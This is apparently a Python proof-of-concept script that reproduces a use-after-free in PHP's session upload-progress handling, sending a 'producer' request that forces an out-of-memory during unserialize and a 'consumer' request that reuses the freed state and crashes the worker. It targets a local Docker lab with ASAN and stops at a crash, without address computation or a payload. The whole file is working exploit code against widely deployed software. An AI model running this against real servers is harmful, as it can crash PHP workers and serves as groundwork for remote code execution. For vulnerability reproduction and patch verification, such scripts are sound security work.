#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reproduction of CVE-2026-109619 (RCE via stale global state) — two requests.

Mechanism (advisory GHSA-6wmf-4rv5-p3rp + independent analysis of
santihabib/CVE-2026-109619):

  Request 1 (PRODUCER)
    Multipart with PHP_SESSION_UPLOAD_PROGRESS. During startup, before
    RINIT, the hook decodes the session file. If that session is huge,
    array_init_size(N) exceeds memory_limit -> OOM inside unserialize ->
    zend_bailout() skips PHP_VAR_UNSERIALIZE_DESTROY -> the BG(unserialize)
    global is left with level>0 pointing at a request heap that gets freed.
    Response: 500.
  Request 2 (CONSUMER)
    Same worker. The hook reaches the session state again BEFORE the normal
    RINIT -> the unserializer reuses the freed pointer -> SEGV in tmp_var
    (ext/standard/var_unserializer.c).

Lab requirements:
  * PHP_CLI_SERVER_WORKERS=1  -> producer and consumer land on the same worker.
  * USE_ZEND_ALLOC=1           -> real memory_limit (needed for the OOM).
  * ASAN=1                     -> the SEGV is reported with a symbolised trace.
  * Big session planted in session.save_path (lab shortcut, as in the public
    reproduction).

Expected differential:
  * 8.4.26 / 8.5.11 (vulnerable) -> the worker dies (SEGV) on request 2.
  * 8.4.27 / 8.5.12 (patched)     -> request 2 answers 200 and the worker
    survives.

This script computes no addresses and forges no structures: it only chains
producer and consumer so the memory error becomes observable.
"""

import argparse
import sys
import time
import urllib.parse
import urllib.request

BOUNDARY = "----b"


def part(name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + BOUNDARY.encode() + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def upload_progress_body(sid):
    """Minimal upload progress multipart: fires the hook during startup."""
    return (
        part("PHPSESSID", sid.encode()) + b"\r\n"
        + part("PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        + part("f", b"Z" * 32, filename="a") + b"\r\n"
        + b"--" + BOUNDARY.encode() + b"--\r\n"
    )


def mutator(mutator_url, sid, mode, extra=None):
    params = {"sid": sid, "mode": mode}
    if extra:
        params.update(extra)
    url = f"{mutator_url}?{urllib.parse.urlencode(params)}"
    try:
        with urllib.request.urlopen(url, timeout=120) as r:
            out = r.read().decode(errors="replace").strip()
            print(f"[*] mutator[{mode}]: {out}")
            return out
    except Exception as e:  # noqa: BLE001
        print(f"[!] mutator[{mode}] failed: {e}")
        return ""


def post(host, port, path, body, sid, timeout=60):
    import socket
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(head + body)
        s.settimeout(timeout)
        data = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, OSError):
            pass
        return data
    finally:
        s.close()


def plant_out_of_band(sid, docker="php-uaf-lab"):
    """Writes the small session WITHOUT going through the worker.

    Important: if it were planted with an HTTP request, that request would be
    served by the same worker and its normal RINIT would reset the stale state
    (BG(unserialize)), so the consumer would find nothing. The file must be
    written out of band (docker exec / volume access).
    """
    import subprocess
    path = f"/tmp/sessions/sess_{sid}"
    cmd = ["docker", "exec", docker, "sh", "-c",
           f"printf 'upload_progress_x|i:1;' > {path}"]
    try:
        subprocess.run(cmd, check=True, capture_output=True, timeout=30)
        print(f"[*] small session planted out of band ({path})")
        return True
    except Exception as e:  # noqa: BLE001
        print(f"[!] could not plant out of band: {e}")
        return False


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109619 cross-request UAF (two requests)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/")
    ap.add_argument("--mutator-url", default="http://127.0.0.1:8080/_lab_mutator.php")
    ap.add_argument("--docker", default="php-uaf-lab",
                    help="container where the small session is written (out of band)")
    ap.add_argument("--sid", default="decafbaddecafbaddecafbad")
    ap.add_argument("--elements", type=int, default=1048576,
                    help="elements of the huge session (array_init_size exceeds memory_limit)")
    ap.add_argument("--rounds", type=int, default=2)
    args = ap.parse_args()

    print(f"[*] session.upload_progress + session of {args.elements} elements")
    for r in range(1, args.rounds + 1):
        print(f"--- round {r}")
        # 1) Huge session for the producer
        mutator(args.mutator_url, args.sid, "huge", {"n": args.elements})
        # 2) PRODUCER: decoding the huge session OOMs during startup
        try:
            resp = post(args.host, args.port, args.path, upload_progress_body(args.sid), args.sid)
            line = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
            print(f"    producer  -> {line} ({len(resp)}B)")
        except OSError as e:
            print(f"    producer  -> {e.__class__.__name__}")
        time.sleep(0.5)
        # 3) Small session for the consumer, planted OUT of the worker
        if not plant_out_of_band(args.sid, args.docker):
            mutator(args.mutator_url, args.sid, "small")
        # 4) CONSUMER: reuses the freed pointer
        try:
            resp2 = post(args.host, args.port, args.path, upload_progress_body(args.sid), args.sid)
            line2 = resp2.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp2 else "NO RESPONSE"
            print(f"    consumer -> {line2} ({len(resp2)}B)")
        except OSError as e:
            print(f"    consumer -> {e.__class__.__name__}: the worker died (UAF materialised)")
        time.sleep(0.5)

    print("[*] Check ASAN: docker logs php-uaf-lab 2>&1 | grep -B5 -A45 'AddressSanitizer'")
    return 0


if __name__ == "__main__":
    sys.exit(main())
